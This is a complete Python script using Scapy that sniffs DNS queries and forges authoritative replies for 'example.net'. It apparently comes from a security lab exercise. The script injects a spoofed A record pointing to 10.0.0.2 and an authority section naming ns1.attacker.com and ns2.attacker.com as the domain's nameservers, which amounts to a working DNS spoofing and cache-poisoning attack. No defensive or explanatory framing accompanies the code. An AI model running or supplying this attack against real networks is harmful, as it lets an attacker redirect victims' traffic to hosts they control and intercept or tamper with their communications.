#!/usr/bin/python

from scapy.all import *

def spoof_dns(pkt):
    # Check if the packet has a DNS layer and if the query is for 'example.net'
    if (DNS in pkt and b'example.net' in pkt[DNS].qd.qname):
        
        # Swap the source and destination IP address
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        
        # Swap the source and destination port number
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
        
        # The Answer Section - We don't need to modify the answer section for authority spoofing
        # However, we need to create a placeholder here for the DNSRR section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=303030, rdata='10.0.0.2')
        
        # The Authority Section with two NS records
        # ns1.attacker.com and ns2.attacker.com as the new authoritative name servers
        NSsec1 = DNSRR(rrname='example.net', type='NS', ttl=303030, rdata='ns1.attacker.com')
        NSsec2 = DNSRR(rrname='example.net', type='NS', ttl=303030, rdata='ns2.attacker.com')
        
        # Construct the DNS packet
        DNSpkt = DNS(
            id=pkt[DNS].id,       # DNS Query ID
            qr=1,                 # This is a response
            aa=1,                 # Authoritative Answer
            qd=pkt[DNS].qd,       # Question section copied from the request
            an=Anssec,            # Answer section (though not necessary for this attack)
            ns=NSsec1/NSsec2      # Authority section with the spoofed name servers
        )
        
        # Construct the entire IP packet
        spoofpkt = IPpkt / UDPpkt / DNSpkt
        
        # Send the spoofed packet
        send(spoofpkt)

# Sniff UDP packets sent to port 53 (DNS) and apply the spoof_dns function to each packet
pkt = sniff(filter='udp and dst port 53', prn=spoof_dns)